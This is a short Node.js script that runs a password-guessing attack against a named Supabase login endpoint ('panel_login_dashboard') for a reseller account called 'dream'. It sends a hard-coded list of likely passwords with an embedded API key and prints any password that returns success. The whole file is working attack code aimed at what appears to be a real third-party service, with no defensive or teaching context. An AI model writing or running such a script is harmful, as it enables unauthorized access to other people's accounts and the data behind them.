const https = require("https");
const passes = ["dream", "dream123", "dream1234", "dream12345", "redon", "redon123", "admin", "123456", "1234", "onbesttv", "eagle"];

async function tryPass(pass) {
  return new Promise(resolve => {
    const payload = JSON.stringify({ p_reseller_id: "dream", p_password: pass });
    const req = https.request({
      hostname: "myreymyqsnikjdhnstjn.supabase.co",
      path: "/rest/v1/rpc/panel_login_dashboard",
      method: "POST",
      headers: {
        "apikey": "sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM",
        "Authorization": "Bearer sb_publishable_Jsb0b0Kcf5-bv6GCUFu3KA_wO1G9HjM",
        "Content-Type": "application/json"
      }
    }, res => {
      let data = "";
      res.on("data", c => data += c);
      res.on("end", () => {
        if (res.statusCode === 200) {
          resolve({ pass, data });
        } else {
          resolve(null);
        }
      });
    });
    req.write(payload);
    req.end();
  });
}

(async () => {
  for (const p of passes) {
    const res = await tryPass(p);
    if (res) {
      console.log("FOUND PASSWORD:", res.pass);
      console.log(res.data);
      return;
    }
  }
  console.log("None matched");
})();
